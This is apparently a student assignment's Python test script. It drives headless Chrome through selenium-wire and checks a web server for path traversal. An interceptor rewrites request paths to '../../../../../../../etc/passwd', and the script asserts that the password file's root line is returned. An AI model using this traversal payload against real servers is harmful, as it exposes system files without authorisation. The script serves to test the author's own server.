"""
File: http_server.py
Assignment: Web Server Assignment
Lanuguage: python3
Author: Sean Kells <spk3077@rit.edu>
Purpose: Test Path Traversal Vulnerability with Web Server
Running: python3 selenium.py <IP> <Port> <Scheme (HTTP/HTTPS>)
Example Run: python3 selenium.py localhost 80 http
"""
import sys
import re

from seleniumwire import webdriver
from selenium.webdriver.common.by import By


def check_input():
    """
    check_input checks for input errors

    :return: Nothing
    """
    # Check arguments are present
    if not len(sys.argv) == 4:
        print("There must be three arguments to script")
        print("EX: python3 selenium.py <IP> <Port> <Scheme>")
        print("EX: python3 selenium.py 127.0.0.1 80 http")
        exit(1)
    
    # Check <IP> Argument Format
    elif not sys.argv[1] == 'localhost' and not re.match(r'^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$', sys.argv[1]) \
        and not re.match(r'^([\w\-_]+(?:(?:\.[\w\-_]+)+))$', sys.argv[1]):
        print("The IP argument should be the format x.x.x.x or localhost")
        print("EX: python3 selenium.py <IP> <Port> <Scheme>")
        print("EX: python3 selenium.py 127.0.0.1 80 http")
        exit(1)

    # Check <Port> Argument Format
    elif not re.match(r'^[0-9]{1,5}$', sys.argv[2]):
        print("The port argument should be numeric")
        print("EX: python3 selenium.py <IP> <Port> <Scheme>")
        print("EX: python3 selenium.py 127.0.0.1 80 http")
        exit(1)

    # Check <Scheme> Argument Format
    elif not sys.argv[3] == "http" and not sys.argv[3] == "https":
        print("The scheme argument should be http or https")
        print("EX: python3 selenium.py <IP> <Port> <Scheme>")
        print("EX: python3 selenium.py 127.0.0.1 80 http")
        exit(1)


def interceptor(request):
    """
    interceptor modifies the path of the intercepted HTTP request

    :param request: intercepted HTTP request
    :return: Nothing
    """
    request.path = "../../../../../../../etc/passwd"


def test_vulnerability(ip: str, port: int, scheme: str):
    """
    test_vulnerability assesses the input destination for /etc/passwd content

    :param ip: IP of Web Server
    :param port: Port of Web Server
    :param scheme: Web Server is HTTP or HTTPS
    :return: Nothing
    """
    # Setup
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument('--headless')

    driver = webdriver.Chrome(options = chrome_options)
    url: str = "%s://%s:%s/../../../../../../../etc/passwd" % (scheme, ip, port,)

    # Test #1
    # Vulnerability does not Execute
    # By default browsers remove the added '/../../../../../../../' hence preventing the exploit from exploitation by normal users even accidentally
    driver.get(url)

    header_element = driver.find_element(By.TAG_NAME, "h1")
    assert header_element.text == "404 Not Found"
    print("Test #1 PASSED")

    # Test #2
    # Vulnerability does Execute
    # By adding an interceptor to replace the request_uri with '../../../../../../../etc/passwd' the web server fetches the exact resource intended
    driver.request_interceptor = interceptor
    driver.get(url)
    
    found_passwd: int = driver.page_source.find("root:x:0:0:root:/root:/bin/bash")
    assert found_passwd != -1
    print("Test #2 PASSED")
    
    driver.quit()


def main():
    """
    main is the primary intended Python script to run to execute entire server

    :return: Nothing
    """
    check_input()
    test_vulnerability(sys.argv[1], sys.argv[2], sys.argv[3])
    print("Finished successfully!")
    

if __name__ == "__main__":
    main()
